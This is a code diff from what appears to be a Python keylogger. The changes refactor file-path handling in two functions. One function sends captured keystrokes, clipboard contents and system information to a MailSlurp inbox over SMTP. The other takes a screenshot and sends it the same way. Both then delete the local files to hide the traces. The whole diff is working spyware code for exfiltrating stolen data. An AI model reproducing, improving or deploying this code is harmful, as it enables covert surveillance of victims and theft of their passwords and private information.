@@ -191,7 +191,7 @@ with mailslurp_client.ApiClient(configuration) as api_client:
 access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
 
 def send_log():
-    with open(file_path+ '\\keylogger'+'\\key_log.txt', 'rb') as f1,open(file_path+ '\\keylogger'+'\\systeminfo.txt', 'rb') as f2,open(file_path+ '\\keylogger'+'\\clipboard.txt', 'rb') as f3:
+    with open(file_path+ extend + keys_information, 'rb') as f1,open(file_path+ extend +system_information, 'rb') as f2,open(file_path+ extend + clipboard_information, 'rb') as f3:
         file1_data=f1.read() 
         file1_name=f1.name()
         file2_data=f2.read() 
@@ -212,13 +212,13 @@ def send_log():
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     #print("check your mail :)")
-    os.remove(file_path+ '\\keylogger'+'\\key_log.txt')
-    os.remove(file_path+ '\\keylogger'+'\\clipboard.txt')
-    os.remove(file_path+ '\\keylogger'+'\\systeminfo.txt') #deletes files
+    os.remove(file_path+ extend + keys_information)
+    os.remove(file_path+ extend +system_information)
+    os.remove(file_path+ extend + clipboard_information) #deletes files
 
 def send_img():
     screenshot()
-    with open(file_path+ '\\keylogger'+'\\screenshot.png', 'rb') as f4:
+    with open(file_path+ extend + screenshot_information, 'rb') as f4:
         file_data=f4.read() 
         file_name=f4.name
     
@@ -234,7 +234,7 @@ def send_img():
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     #print("check your mail :)")
-    os.remove(file_path+ '\\keylogger'+'\\screenshot.png') #deletes png file
+    os.remove(file_path+ extend + screenshot_information) #deletes png file
 
 
 
